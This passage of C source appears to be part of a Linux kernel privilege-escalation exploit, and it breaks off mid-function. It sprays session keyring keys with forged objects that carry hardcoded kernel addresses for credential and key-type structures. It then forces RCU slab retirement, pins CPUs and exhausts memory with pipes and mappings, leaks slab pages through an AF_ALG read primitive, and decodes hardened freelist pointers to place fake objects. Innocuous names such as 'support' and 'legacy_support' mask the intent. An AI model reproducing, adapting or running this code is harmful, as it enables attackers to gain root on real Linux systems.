#define main k2_legacy_support_main
#include "public_helper_base.inc"
#undef main

#include <limits.h>
#include <sys/mman.h>
#include <sys/resource.h>

#define SUPPORT_CARRIERS 56
#define SUPPORT_GENERATIONS 8
#define SUPPORT_CHILDREN 24
#define SUPPORT_FILES 900
#define DEFAULT_ATTEMPTS 256
#define CRED_DEFAULT_ATTEMPTS 512
#define TASK_STRUCT_STRIDE 3584
#define TASK_REAL_CRED 2080
#define TASK_CRED 2088
#define MAX_QUARANTINE_PIPES 256
#define PRESSURE_DEFAULT_RESERVE_MIB 256
#define PRESSURE_PIPE_BYTES (1U * 1024U * 1024U)
#define PRESSURE_MAX_PIPES 64
#define PRESSURE_ANON_CHUNK_BYTES (16U * 1024U * 1024U)
#define PRESSURE_MAX_ANON_CHUNKS 4096
#define SUPPORT_FAKE_ADDRESS UINT64_C(0xffff9e8d4011b318)

struct kept_payload_capture {
    key_serial_t ring;
    key_serial_t serials[SUPPORT_CARRIERS];
    size_t count;
    bool valid;
};

static struct kept_payload_capture kept_payload;
static bool keep_payload_on_success;

/* Ownership of the live ring and carrier serials transfers to the caller; no
 * same-cache cleanup happens between slab decode and final-fake reback. */
int k2_runtime_take_payload_capture(key_serial_t *ring, key_serial_t *serials,
                                    size_t capacity, size_t *count)
{
    if (!ring || !serials || !count)
        return -EINVAL;
    if (!kept_payload.valid)
        return -ENOENT;
    if (capacity < kept_payload.count)
        return -ENOSPC;
    *ring = kept_payload.ring;
    *count = kept_payload.count;
    memcpy(serials, kept_payload.serials, kept_payload.count * sizeof(*serials));
    memset(&kept_payload, 0, sizeof(kept_payload));
    return 0;
}

static const size_t task_cred_page_offsets[] = {
    2080, 1568, 1056, 544, 32, 3616, 3104, 2592,
};

struct page_quarantine {
    int pipes[MAX_QUARANTINE_PIPES][2];
    size_t capacity[MAX_QUARANTINE_PIPES];
    size_t used[MAX_QUARANTINE_PIPES];
    unsigned int count;
    size_t retained_bytes;
};

struct pressure_pipe {
    int read_fd;
    int write_fd;
    size_t capacity;
    size_t retained;
};

struct pressure_mapping {
    void *address;
    size_t length;
};

struct memory_pressure {
    struct pressure_pipe *pipes;
    struct pressure_mapping *mappings;
    size_t count;
    size_t capacity;
    size_t mapping_count;
    size_t mapping_capacity;
    uint64_t initial_available_bytes;
    uint64_t final_available_bytes;
    uint64_t reserve_bytes;
    uint64_t target_bytes;
    uint64_t retained_bytes;
    uint64_t pipe_capacity_bytes;
    uint64_t anonymous_bytes;
    uint64_t pipe_user_pages_soft;
    uint64_t pipe_user_pages_hard;
    uint64_t pipe_max_size;
    uint64_t nofile_soft;
    uint64_t nofile_hard;
    unsigned int pipe_failures;
    unsigned int resize_failures;
    unsigned int write_failures;
    unsigned int meminfo_failures;
    unsigned int mmap_failures;
    unsigned int sysctl_failures;
    unsigned int rlimit_failures;
    int cpu;
};

static int pin_to_last_cpu(void);

static void pressure_init(struct memory_pressure *pressure, int cpu,
                          uint64_t reserve_bytes)
{
    memset(pressure, 0, sizeof(*pressure));
    pressure->cpu = cpu;
    pressure->reserve_bytes = reserve_bytes;
}

static void pressure_destroy(struct memory_pressure *pressure)
{
    for (size_t i = pressure->mapping_count; i > 0; i--)
        if (pressure->mappings[i - 1].address != MAP_FAILED)
            munmap(pressure->mappings[i - 1].address,
                   pressure->mappings[i - 1].length);
    for (size_t i = pressure->count; i > 0; i--) {
        if (pressure->pipes[i - 1].read_fd >= 0)
            close(pressure->pipes[i - 1].read_fd);
        if (pressure->pipes[i - 1].write_fd >= 0)
            close(pressure->pipes[i - 1].write_fd);
    }
    free(pressure->pipes);
    free(pressure->mappings);
    pressure->pipes = NULL;
    pressure->mappings = NULL;
    pressure->count = 0;
    pressure->capacity = 0;
    pressure->mapping_count = 0;
    pressure->mapping_capacity = 0;
}

static uint64_t pressure_release_pipe_tier(struct memory_pressure *pressure)
{
    uint64_t released = 0;

    for (size_t i = pressure->count; i > 0; i--) {
        struct pressure_pipe *pipe = &pressure->pipes[i - 1];

        released += pipe->retained;
        if (pipe->read_fd >= 0) {
            close(pipe->read_fd);
            pipe->read_fd = -1;
        }
        if (pipe->write_fd >= 0) {
            close(pipe->write_fd);
            pipe->write_fd = -1;
        }
        pipe->retained = 0;
    }
    if (released <= pressure->retained_bytes)
        pressure->retained_bytes -= released;
    else
        pressure->retained_bytes = 0;
    printf("PRESSURE_PIPE_RELEASE released_bytes=%" PRIu64
           " anonymous_retained_bytes=%" PRIu64 " pipes=%zu\n", released,
           pressure->anonymous_bytes, pressure->count);
    return released;
}

static int parse_mem_available(FILE *stream, uint64_t *bytes)
{
    char line[256];

    while (fgets(line, sizeof(line), stream)) {
        unsigned long long kib;
        char unit[16];

        if (sscanf(line, "MemAvailable: %llu %15s", &kib, unit) != 2)
            continue;
        if (strcmp(unit, "kB"))
            return -EINVAL;
        if (kib > UINT64_MAX / 1024)
            return -EOVERFLOW;
        *bytes = (uint64_t)kib * 1024;
        return 0;
    }
    return ferror(stream) ? -EIO : -ENOENT;
}

static int read_mem_available(uint64_t *bytes)
{
    FILE *stream = fopen("/proc/meminfo", "r");
    int rc;

    if (!stream)
        return -errno;
    rc = parse_mem_available(stream, bytes);
    if (fclose(stream) && !rc)
        rc = -errno;
    return rc;
}

static int read_uint64_file(const char *path, uint64_t *value)
{
    unsigned long long parsed;
    FILE *stream = fopen(path, "r");
    int rc = 0;

    if (!stream)
        return -errno;
    if (fscanf(stream, "%llu", &parsed) != 1)
        rc = -EINVAL;
    else
        *value = (uint64_t)parsed;
    if (fclose(stream) && !rc)
        rc = -errno;
    return rc;
}

static void pressure_read_limits(struct memory_pressure *pressure,
                                 bool raise_nofile)
{
    struct rlimit limit;

    if (read_uint64_file("/proc/sys/fs/pipe-user-pages-soft",
                         &pressure->pipe_user_pages_soft))
        pressure->sysctl_failures++;
    if (read_uint64_file("/proc/sys/fs/pipe-user-pages-hard",
                         &pressure->pipe_user_pages_hard))
        pressure->sysctl_failures++;
    if (read_uint64_file("/proc/sys/fs/pipe-max-size",
                         &pressure->pipe_max_size))
        pressure->sysctl_failures++;
    if (getrlimit(RLIMIT_NOFILE, &limit) < 0) {
        pressure->rlimit_failures++;
        return;
    }
    pressure->nofile_soft = limit.rlim_cur == RLIM_INFINITY ? UINT64_MAX :
                            (uint64_t)limit.rlim_cur;
    pressure->nofile_hard = limit.rlim_max == RLIM_INFINITY ? UINT64_MAX :
                            (uint64_t)limit.rlim_max;
    if (raise_nofile && limit.rlim_cur < limit.rlim_max) {
        limit.rlim_cur = limit.rlim_max;
        if (setrlimit(RLIMIT_NOFILE, &limit) < 0)
            pressure->rlimit_failures++;
        else
            pressure->nofile_soft = pressure->nofile_hard;
    }
}

static int pressure_grow_pipes(struct memory_pressure *pressure)
{
    struct pressure_pipe *pipes;
    size_t capacity;

    if (pressure->count < pressure->capacity)
        return 0;
    if (pressure->count == PRESSURE_MAX_PIPES)
        return -ENOSPC;
    capacity = pressure->capacity ? pressure->capacity * 2 : 16;
    if (capacity > PRESSURE_MAX_PIPES)
        capacity = PRESSURE_MAX_PIPES;
    if (capacity < pressure->capacity || capacity > SIZE_MAX / sizeof(*pipes))
        return -EOVERFLOW;
    pipes = realloc(pressure->pipes, capacity * sizeof(*pipes));
    if (!pipes)
        return -ENOMEM;
    pressure->pipes = pipes;
    pressure->capacity = capacity;
    return 0;
}

static int pressure_fill_pipe(struct memory_pressure *pressure,
                              size_t requested, size_t page_size)
{
    unsigned char page[4096];
    int fds[2] = {-1, -1};
    size_t retained = 0;
    int pipe_capacity;
    int rc;

    if (page_size != sizeof(page))
        return -EINVAL;
    rc = pressure_grow_pipes(pressure);
    if (rc)
        return rc;
    if (pipe2(fds, O_CLOEXEC) < 0) {
        pressure->pipe_failures++;
        return -errno;
    }
    if (fcntl(fds[1], F_SETPIPE_SZ, PRESSURE_PIPE_BYTES) < 0)
        pressure->resize_failures++;
    pipe_capacity = fcntl(fds[1], F_GETPIPE_SZ);
    if (pipe_capacity < 0) {
        rc = -errno;
        pressure->pipe_failures++;
        goto failed;
    }
    if (requested > (size_t)pipe_capacity)
        requested = (size_t)pipe_capacity;
    requested -= requested % page_size;
    if (!requested) {
        rc = -ENOSPC;
        goto failed;
    }
    for (size_t offset = 0; offset < sizeof(page); offset += sizeof(uint64_t))
        put_u64(page + offset, UINT64_C(0x4b32505245535300) ^
                pressure->retained_bytes ^ offset);
    while (retained < requested) {
        ssize_t written = write(fds[1], page, page_size);

        if (written != (ssize_t)page_size) {
            rc = written < 0 ? -errno : -EIO;
            pressure->write_failures++;
            goto failed;
        }
        retained += page_size;
    }
    pressure->pipes[pressure->count++] = (struct pressure_pipe){
        .read_fd = fds[0],
        .write_fd = fds[1],
        .capacity = (size_t)pipe_capacity,
        .retained = retained,
    };
    pressure->retained_bytes += retained;
    pressure->pipe_capacity_bytes += (size_t)pipe_capacity;
    return 0;
failed:
    if (fds[0] >= 0)
        close(fds[0]);
    if (fds[1] >= 0)
        close(fds[1]);
    return rc;
}

static int pressure_grow_mappings(struct memory_pressure *pressure)
{
    struct pressure_mapping *mappings;
    size_t capacity;

    if (pressure->mapping_count < pressure->mapping_capacity)
        return 0;
    if (pressure->mapping_count == PRESSURE_MAX_ANON_CHUNKS)
        return -ENOSPC;
    capacity = pressure->mapping_capacity ? pressure->mapping_capacity * 2 : 16;
    if (capacity > PRESSURE_MAX_ANON_CHUNKS)
        capacity = PRESSURE_MAX_ANON_CHUNKS;
    if (capacity < pressure->mapping_capacity ||
        capacity > SIZE_MAX / sizeof(*mappings))
        return -EOVERFLOW;
    mappings = realloc(pressure->mappings, capacity * sizeof(*mappings));
    if (!mappings)
        return -ENOMEM;
    pressure->mappings = mappings;
    pressure->mapping_capacity = capacity;
    return 0;
}

static int pressure_fill_anonymous(struct memory_pressure *pressure,
                                   size_t requested, size_t page_size)
{
    unsigned char *mapping;
    int rc;

    rc = pressure_grow_mappings(pressure);
    if (rc)
        return rc;
    if (requested > PRESSURE_ANON_CHUNK_BYTES)
        requested = PRESSURE_ANON_CHUNK_BYTES;
    requested -= requested % page_size;
    if (!requested)
        return -ENOSPC;
    mapping = mmap(NULL, requested, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mapping == MAP_FAILED) {
        pressure->mmap_failures++;
        return -errno;
    }
#ifdef MADV_NOHUGEPAGE
    (void)madvise(mapping, requested, MADV_NOHUGEPAGE);
#endif
    for (size_t offset = 0; offset < requested; offset += page_size)
        mapping[offset] = (unsigned char)(0x4bU ^ pressure->mapping_count ^
                                          (offset / page_size));
    pressure->mappings[pressure->mapping_count++] =
        (struct pressure_mapping){.address = mapping, .length = requested};
    pressure->retained_bytes += requested;
    pressure->anonymous_bytes += requested;
    return 0;
}

static void print_pressure_result(const struct memory_pressure *pressure,
                                  const char *mode)
{
    unsigned int failures = pressure->pipe_failures +
                            pressure->resize_failures +
                            pressure->write_failures +
                            pressure->meminfo_failures +
                            pressure->mmap_failures +
                            pressure->sysctl_failures +
                            pressure->rlimit_failures;

    printf("MEM_PRESSURE mode=%s initial_available_bytes=%" PRIu64
           " reserve_bytes=%" PRIu64 " target_bytes=%" PRIu64
           " retained_bytes=%" PRIu64 " final_available_bytes=%" PRIu64
           " pipes=%zu pipe_capacity_bytes=%" PRIu64
           " anonymous_mappings=%zu anonymous_bytes=%" PRIu64
           " pipe_user_pages_soft=%" PRIu64
           " pipe_user_pages_hard=%" PRIu64 " pipe_max_size=%" PRIu64
           " nofile_soft=%" PRIu64 " nofile_hard=%" PRIu64
           " pipe_failures=%u resize_failures=%u write_failures=%u"
           " meminfo_failures=%u mmap_failures=%u"
           " sysctl_failures=%u rlimit_failures=%u"
           " failures=%u cpu=%d\n", mode, pressure->initial_available_bytes,
           pressure->reserve_bytes, pressure->target_bytes,
           pressure->retained_bytes, pressure->final_available_bytes,
           pressure->count, pressure->pipe_capacity_bytes,
           pressure->mapping_count, pressure->anonymous_bytes,
           pressure->pipe_user_pages_soft, pressure->pipe_user_pages_hard,
           pressure->pipe_max_size, pressure->nofile_soft,
           pressure->nofile_hard, pressure->pipe_failures,
           pressure->resize_failures, pressure->write_failures,
           pressure->meminfo_failures, pressure->mmap_failures,
           pressure->sysctl_failures, pressure->rlimit_failures, failures,
           pressure->cpu);
}

static void report_control_pressure(struct memory_pressure *pressure)
{
    pressure_read_limits(pressure, false);
    if (read_mem_available(&pressure->initial_available_bytes))
        pressure->meminfo_failures++;
    pressure->final_available_bytes = pressure->initial_available_bytes;
    print_pressure_result(pressure, "control");
}

static int apply_memory_pressure(struct memory_pressure *pressure)
{
    long configured_page_size = sysconf(_SC_PAGESIZE);
    size_t page_size;
    int rc, pipe_stop_rc = 0, anonymous_stop_rc = 0;

    if (configured_page_size <= 0)
        return -EINVAL;
    page_size = (size_t)configured_page_size;
    pressure_read_limits(pressure, true);
    rc = read_mem_available(&pressure->initial_available_bytes);
    if (rc) {
        pressure->meminfo_failures++;
        print_pressure_result(pressure, "pipe+anonymous");
        printf("PRESSURE_GATE reason=memavailable_initial_read_failed error=%d"
               "\n", -rc);
        return rc;
    }
    pressure->final_available_bytes = pressure->initial_available_bytes;
    if (pressure->initial_available_bytes > pressure->reserve_bytes) {
        pressure->target_bytes =
            pressure->initial_available_bytes - pressure->reserve_bytes;
        pressure->target_bytes -= pressure->target_bytes % page_size;
    }
    while (pressure->final_available_bytes > pressure->reserve_bytes &&
           pressure->retained_bytes < pressure->target_bytes) {
        uint64_t remaining = pressure->target_bytes - pressure->retained_bytes;
        uint64_t above_reserve = pressure->final_available_bytes -
                                 pressure->reserve_bytes;
        uint64_t requested = remaining;

        if (requested > above_reserve)
            requested = above_reserve;
        if (requested > PRESSURE_PIPE_BYTES)
            requested = PRESSURE_PIPE_BYTES;
        requested -= requested % page_size;
        if (!requested)
            break;
        rc = pressure_fill_pipe(pressure, (size_t)requested, page_size);
        if (rc) {
            pipe_stop_rc = rc;
            break;
        }
        rc = read_mem_available(&pressure->final_available_bytes);
        if (rc) {
            pressure->meminfo_failures++;
            goto failed;
        }
    }
    while (pressure->final_available_bytes > pressure->reserve_bytes + page_size) {
        uint64_t above_reserve = pressure->final_available_bytes -
                                 pressure->reserve_bytes;
        uint64_t requested = above_reserve;

        if (requested > PRESSURE_ANON_CHUNK_BYTES)
            requested = PRESSURE_ANON_CHUNK_BYTES;
        requested -= requested % page_size;
        if (!requested)
            break;
        rc = pressure_fill_anonymous(pressure, (size_t)requested, page_size);
        if (rc) {
            anonymous_stop_rc = rc;
            break;
        }
        rc = read_mem_available(&pressure->final_available_bytes);
        if (rc) {
            pressure->meminfo_failures++;
            goto failed;
        }
    }
    print_pressure_result(pressure, "pipe+anonymous");
    if (pressure->final_available_bytes > pressure->reserve_bytes + page_size) {
        printf("PRESSURE_GATE reason=reserve_not_reached"
               " above_reserve_bytes=%" PRIu64 " pipe_stop_error=%d"
               " anonymous_stop_error=%d\n",
               pressure->final_available_bytes - pressure->reserve_bytes,
               pipe_stop_rc ? -pipe_stop_rc : 0,
               anonymous_stop_rc ? -anonymous_stop_rc : 0);
        return anonymous_stop_rc ? anonymous_stop_rc :
               pipe_stop_rc ? pipe_stop_rc : -ENOSPC;
    }
    printf("PRESSURE_READY reached_reserve=1 final_available_bytes=%" PRIu64
           " reserve_bytes=%" PRIu64 " retained_bytes=%" PRIu64
           " pipe_stop_error=%d anonymous_stop_error=%d\n",
           pressure->final_available_bytes, pressure->reserve_bytes,
           pressure->retained_bytes, pipe_stop_rc ? -pipe_stop_rc : 0,
           anonymous_stop_rc ? -anonymous_stop_rc : 0);
    return 0;
failed:
    print_pressure_result(pressure, "pipe+anonymous");
    printf("PRESSURE_GATE reason=pressure_or_meminfo_failed error=%d\n", -rc);
    return rc;
}

static void quarantine_init(struct page_quarantine *q)
{
    memset(q, 0, sizeof(*q));
    for (unsigned int i = 0; i < MAX_QUARANTINE_PIPES; i++)
        q->pipes[i][0] = q->pipes[i][1] = -1;
}

static void quarantine_destroy(struct page_quarantine *q)
{
    afalg_quarantine_write_fd = -1;
    for (unsigned int i = 0; i < q->count; i++) {
        if (q->pipes[i][0] >= 0)
            close(q->pipes[i][0]);
        if (q->pipes[i][1] >= 0)
            close(q->pipes[i][1]);
    }
}

static int quarantine_prepare(struct page_quarantine *q, size_t need)
{
    unsigned int i;
    int requested = 1 << 20;

    if (q->count) {
        i = q->count - 1;
        if (q->capacity[i] - q->used[i] >= need)
            goto selected;
    }
    if (q->count == MAX_QUARANTINE_PIPES)
        return -ENOSPC;
    i = q->count++;
    if (pipe2(q->pipes[i], O_CLOEXEC | O_NONBLOCK) < 0)
        return -errno;
    if (fcntl(q->pipes[i][1], F_SETPIPE_SZ, requested) < 0 && errno != EPERM)
        return -errno;
    requested = fcntl(q->pipes[i][1], F_GETPIPE_SZ);
    if (requested < 0)
        return -errno;
    q->capacity[i] = (size_t)requested;
    if (q->capacity[i] < need)
        return -ENOSPC;
selected:
    afalg_quarantine_write_fd = q->pipes[i][1];
    q->used[i] += need;
    q->retained_bytes += need;
    return 0;
}

static int reconstruct_payload_page(const unsigned char *record, size_t len,
                                    unsigned char page[4096],
                                    struct freelist_solution *solution)
{
    uint64_t enc[H_USER_PAYLOAD_OBJECTS_PER_SLAB];

    if (len < 4096)
        return -EMSGSIZE;
    memset(page, 0, 4096);
    for (size_t i = 0; i < H_USER_PAYLOAD_OBJECTS_PER_SLAB; i++) {
        size_t off = i * H_USER_PAYLOAD_BUCKET + H_USER_PAYLOAD_FREEPTR;

        memcpy(page + off, record + off, sizeof(uint64_t));
        enc[i] = get_u64(page + off);
    }
    return solve_freelist(enc, solution);
}

static void print_fake_candidates(const struct freelist_solution *solution)
{
    printf("SLAB_DECODE base=%#" PRIx64 " random=%#" PRIx64 " terminal=%d\n",
           solution->base, solution->random, solution->terminal);
    for (unsigned int i = 0; i < H_USER_PAYLOAD_OBJECTS_PER_SLAB; i++)
        printf("FAKE_CANDIDATE slot=%u wrapper=%#" PRIx64 " fake=%#" PRIx64
               "\n", i, solution->base + (uint64_t)i * H_USER_PAYLOAD_BUCKET,
               solution->base + (uint64_t)i * H_USER_PAYLOAD_BUCKET +
                   H_USER_PAYLOAD_HEADER);
}

static void make_public_control_pattern(unsigned char page[4096],
                                        unsigned int attempt)
{
    for (size_t offset = 0; offset < 4096; offset += sizeof(uint64_t)) {
        uint64_t word = UINT64_C(0x4b324354524c0000) ^
                        ((uint64_t)attempt << 32) ^
                        ((uint64_t)offset * UINT64_C(0x9e3779b97f4a7c15));

        put_u64(page + offset, word);
    }
}

static int pipe_seed_and_release(const unsigned char pattern[4096])
{
    unsigned char drained[4096];
    int pipes[2] = {-1, -1};
    size_t done = 0;
    int rc = 0;

    if (pipe2(pipes, O_CLOEXEC) < 0)
        return -errno;
    if (fcntl(pipes[1], F_SETPIPE_SZ, 4096) < 0) {
        rc = -errno;
        goto out;
    }
    while (done < sizeof(drained)) {
        ssize_t written = write(pipes[1], pattern + done,
                                sizeof(drained) - done);

        if (written <= 0) {
            rc = written < 0 ? -errno : -EIO;
            goto out;
        }
        done += (size_t)written;
    }
    done = 0;
    while (done < sizeof(drained)) {
        ssize_t got = read(pipes[0], drained + done, sizeof(drained) - done);

        if (got <= 0) {
            rc = got < 0 ? -errno : -EIO;
            goto out;
        }
        done += (size_t)got;
    }
    if (memcmp(pattern, drained, sizeof(drained)))
        rc = -EIO;
out:
    if (pipes[0] >= 0)
        close(pipes[0]);
    if (pipes[1] >= 0)
        close(pipes[1]);
    return rc;
}

static unsigned int count_public_control_windows(const unsigned char *record,
                                                 size_t length,
                                                 const unsigned char pattern[4096],
                                                 size_t stride,
                                                 size_t field_offset,
                                                 unsigned int slots)
{
    unsigned int matches = 0;

    if (length < 4096)
        return 0;
    for (unsigned int slot = 0; slot < slots; slot++) {
        size_t offset = slot * stride + field_offset;

        if (offset + sizeof(uint64_t) > length)
            return 0;
        if (!memcmp(record + offset, pattern + offset, sizeof(uint64_t)))
            matches++;
    }
    return matches;
}

static int public_user_geometry_control(const char *output,
                                        unsigned int attempts,
                                        useconds_t delay, bool file_cred)
{
    struct gap_plan plan;
    unsigned int best_windows = 0;
    const char *geometry = file_cred ? "file-cred" : "payload-freeptr";
    unsigned int slots = file_cred ? k2l.files_per_slab :
                                     H_USER_PAYLOAD_OBJECTS_PER_SLAB;
    size_t stride = file_cred ? H_FILE_STRIDE : H_USER_PAYLOAD_BUCKET;
    size_t field_offset = file_cred ? H_FILE_CRED : H_USER_PAYLOAD_FREEPTR;
    int rc;

    if (!attempts)
        return -EINVAL;
    rc = file_cred ? build_filp_cred_plan(&plan) :
                     build_payload_freelist_plan(&plan);
    if (rc)
        return rc;
    for (unsigned int attempt = 1; attempt <= attempts; attempt++) {
        unsigned char *seed = NULL, *record = NULL;
        unsigned int matches;
        size_t length = 0;
        ssize_t reported = -1;

        seed = malloc(plan.request_len);
        if (!seed)
            return -ENOMEM;
        make_public_control_pattern(seed, attempt);
        for (size_t i = 4096; i < plan.request_len; i++)
            seed[i] = (unsigned char)(0x5aU ^ attempt ^ (unsigned int)i);
        rc = afalg_plan_user_record(&plan, delay, seed, plan.request_len,
                                    &record, &length, &reported);
        if (rc) {
            free(seed);
            free(record);
            return rc;
        }
        matches = count_public_control_windows(record, length, seed, stride,
                                               field_offset, slots);
        if (matches > best_windows)
            best_windows = matches;
        if (reported == (ssize_t)plan.expected_return &&
            length == plan.request_len && matches == slots) {
            rc = write_exact_file(output, record, length);
            free(seed);
            free(record);
            if (rc)
                return rc;
            printf("PUBLIC_USER_CONTROL_PASS geometry=%s attempt=%u"
                   " reported=%zd iterator_request=%zu matched_windows=%u"
                   " output=%s\n", geometry, attempt, reported,
                   plan.request_len, matches, output);
            return 0;
        }
        free(seed);
        free(record);
    }
    printf("PUBLIC_USER_CONTROL_GATE geometry=%s attempts=%u"
           " best_matched_windows=%u expected_reported=%zu"
           " iterator_request=%zu\n", geometry, attempts, best_windows,
           plan.expected_return, plan.request_len);
    return -ENOENT;
}

static int public_helper_control(const char *output, unsigned int attempts,
                                 useconds_t delay, bool file_cred)
{
    unsigned int cpu_attempts[2] = {0};
    unsigned int best_windows = 0;
    unsigned int cpu_count = sysconf(_SC_NPROCESSORS_ONLN) > 1 ? 2 : 1;
    const char *geometry = file_cred ? "file-cred" : "payload-freeptr";
    unsigned int slots = file_cred ? k2l.files_per_slab :
                                     H_USER_PAYLOAD_OBJECTS_PER_SLAB;
    size_t stride = file_cred ? H_FILE_STRIDE : H_USER_PAYLOAD_BUCKET;
    size_t field_offset = file_cred ? H_FILE_CRED : H_USER_PAYLOAD_FREEPTR;
    struct gap_plan plan;
    int rc;

    rc = file_cred ? build_filp_cred_plan(&plan) :
                     build_payload_freelist_plan(&plan);
    if (rc)
        return rc;
    afalg_quarantine_write_fd = -1;
    for (unsigned int attempt = 1; attempt <= attempts; attempt++) {
        unsigned char pattern[4096];
        unsigned char *record = NULL;
        unsigned int cpu = (attempt - 1) % cpu_count;
        unsigned int matches;
        size_t length = 0;

        rc = pin_current_thread((int)cpu);
        if (rc)
            return rc;
        cpu_attempts[cpu]++;
        make_public_control_pattern(pattern, attempt);
        rc = pipe_seed_and_release(pattern);
        if (rc)
            return rc;
        rc = afalg_plan_record(&plan, delay, &record, &length);
        if (rc)
            return rc;
        matches = count_public_control_windows(record, length, pattern, stride,
                                               field_offset, slots);
        if (matches > best_windows)
            best_windows = matches;
        if (matches == slots) {
            rc = write_exact_file(output, record, length);
            free(record);
            if (rc)
                return rc;
            printf("PUBLIC_HELPER_CONTROL_PASS geometry=%s attempt=%u"
                   " matched_windows=%u sample_cpu=%u cpu0_attempts=%u"
                   " cpu1_attempts=%u output=%s\n", geometry, attempt,
                   matches, cpu, cpu_attempts[0], cpu_attempts[1], output);
            return 0;
        }
        free(record);
    }
    printf("PUBLIC_HELPER_CONTROL_GATE geometry=%s attempts=%u"
           " best_matched_windows=%u cpu0_attempts=%u cpu1_attempts=%u"
           " gate=seeded_pipe_page_not_recaptured\n", geometry, attempts,
           best_windows, cpu_attempts[0], cpu_attempts[1]);
    return -ENOENT;
}

static int open_support_ring(void)
{
    int ring = create_keyring("runtime-support", KEY_SPEC_SESSION_KEYRING);

    if (ring < 0)
        fprintf(stderr, "create support ring: %s\n", strerror(-ring));
    return ring;
}

static void cleanup_ring(key_serial_t ring)
{
    if (ring > 0) {
        (void)keyctl_raw(KEYCTL_CLEAR, (unsigned long)ring, 0, 0, 0);
        (void)keyctl_raw(KEYCTL_REVOKE, (unsigned long)ring, 0, 0, 0);
    }
}

static void make_support_fake(unsigned char fake[H_DIRECT_FAKE_BYTES],
                              unsigned int generation)
{
    struct fake_spec spec = {
        .cred = UINT64_C(0xffff9e8d40112280),
        .type = UINT64_C(0xffffffff84ad5ea0),
        .domain_tag = UINT64_C(0xffffffff84ad57b8),
        .description = SUPPORT_FAKE_ADDRESS + k2l.desc_off,
        .hash = UINT64_C(0x4b325041594c4f41) ^ generation,
        .x = UINT64_C(0x5151515151510101),
    };

    build_direct_fake(fake, &spec, SUPPORT_FAKE_ADDRESS);
    put_u32(fake + 4, UINT32_C(0x52540000) | generation);
}

static int retire_payload_generation(key_serial_t ring,
                                     key_serial_t serials[SUPPORT_CARRIERS])
{
    unsigned char first[H_DIRECT_FAKE_BYTES];
    unsigned char second[H_DIRECT_FAKE_BYTES];
    int rc;
    size_t i;

    make_support_fake(first, 1);
    rc = spray_carriers(ring, SUPPORT_CARRIERS, first, serials);
    if (rc)
        return rc;
    /* Queue several same-size generations before forcing a grace period:
     * quota is unchanged, while old 256-byte slabs retire in a batch. */
    for (unsigned int generation = 0; generation < SUPPORT_GENERATIONS;
         generation++) {
        make_support_fake(second, generation + 2);
        for (i = 0; i < SUPPORT_CARRIERS; i++) {
            rc = update_carrier(serials[i], second);
            if (rc)
                return rc;
        }
    }
    rc = global_rcu_gp();
    if (rc)
        return rc;
    sched_yield();
    usleep(1000);
    rc = global_rcu_gp();
    if (rc)
        return rc;
    printf("PAYLOAD_RETIRE carriers=%u generations=%u updates=%u"
           " allocation_request=%u bucket=%u freeptr=%u\n", SUPPORT_CARRIERS,
           SUPPORT_GENERATIONS, SUPPORT_CARRIERS * SUPPORT_GENERATIONS,
           H_USER_PAYLOAD_REQUEST, H_USER_PAYLOAD_BUCKET,
           H_USER_PAYLOAD_FREEPTR);
    return 0;
}

static int capture_payload_slab(const char *output, unsigned int attempts,
                                useconds_t delay, bool enable_pressure,
                                uint64_t reserve_bytes)
{
    key_serial_t serials[SUPPORT_CARRIERS] = {0};
    struct gap_plan plan;
    unsigned char reconstructed[4096];
    struct freelist_solution solution;
    key_serial_t ring = -1;
    struct page_quarantine quarantine;
    struct memory_pressure pressure;
    unsigned int sample_attempts[2] = {0};
    unsigned int sample_cpu_count;
    unsigned int attempt;
    unsigned int current_attempt = 0;
    const char *stage = "init";
    int retire_cpu, rc;

    quarantine_init(&quarantine);
    retire_cpu = pin_to_last_cpu();
    if (retire_cpu < 0)
        return retire_cpu;
    pressure_init(&pressure, retire_cpu, reserve_bytes);
    stage = "pressure";
    if (enable_pressure)
        rc = apply_memory_pressure(&pressure);
    else {
        report_control_pressure(&pressure);
        rc = 0;
    }
    if (rc)
        goto out;
    if (enable_pressure)
        (void)pressure_release_pipe_tier(&pressure);
    stage = "support_ring";
    ring = open_support_ring();
    if (ring < 0) {
        rc = ring;
        goto out;
    }
    stage = "payload_retire";
    rc = retire_payload_generation(ring, serials);
    if (rc)
        goto out;
    stage = "gap_plan";
    rc = build_payload_freelist_plan(&plan);
    if (rc)
        goto out;
    for (unsigned int i = 0; i < H_USER_PAYLOAD_OBJECTS_PER_SLAB; i++) {
        size_t target = i * H_USER_PAYLOAD_BUCKET + H_USER_PAYLOAD_FREEPTR;

        if (!plan_has_gap(&plan, target)) {
            rc = -ERANGE;
            goto out;
        }
    }
    sample_cpu_count = sysconf(_SC_NPROCESSORS_ONLN) > 1 ? 2 : 1;
    for (attempt = 1; attempt <= attempts; attempt++) {
        unsigned char *record = NULL;
        size_t len = 0;
        unsigned int sample_cpu = (attempt - 1) % sample_cpu_count;

        current_attempt = attempt;
        stage = "sample_affinity";
        rc = pin_current_thread((int)sample_cpu);
        if (rc)
            goto out;
        sample_attempts[sample_cpu]++;
        stage = "sample_quarantine";
        rc = quarantine_prepare(&quarantine, plan.expected_return);
        if (rc)
            goto out;
        stage = "sample_afalg";
        rc = afalg_plan_record(&plan, delay, &record, &len);
        if (rc)
            goto out;
        stage = "sample_decode";
        rc = reconstruct_payload_page(record, len, reconstructed, &solution);
        if (!rc) {
            rc = write_exact_file(output, reconstructed, sizeof(reconstructed));
            free(record);
            if (rc)
                goto out;
            printf("PAYLOAD_CAPTURE_PASS attempt=%u freeptr=%u"
                   " disclosed_token_bytes=%u quarantine_pipes=%u"
                   " retained_bytes=%zu retire_cpu=%d sample_cpu=%u"
                   " cpu0_attempts=%u cpu1_attempts=%u output=%s\n", attempt,
                   k2l.freeptr, 16 * 8, quarantine.count,
                   quarantine.retained_bytes, retire_cpu, sample_cpu,
                   sample_attempts[0], sample_attempts[1], output);
            print_fake_candidates(&solution);
            goto out;
        }
        free(record);
        if (rc != -ENOENT && rc != -EINVAL)
            goto out;
    }
    rc = -ENOENT;
    printf("PAYLOAD_CAPTURE_GATE attempts=%u quarantine_pipes=%u"
           " retained_bytes=%zu pressure_cpu=%d cpu0_attempts=%u"
           " cpu1_attempts=%u gate=target_retired_page_not_self_identified\n",
           attempts, quarantine.count, quarantine.retained_bytes, retire_cpu,
           sample_attempts[0], sample_attempts[1]);
out:
    if (rc && rc != -ENOENT)
        printf("PAYLOAD_CAPTURE_ERROR stage=%s attempt=%u rc=%d errno=%d\n",
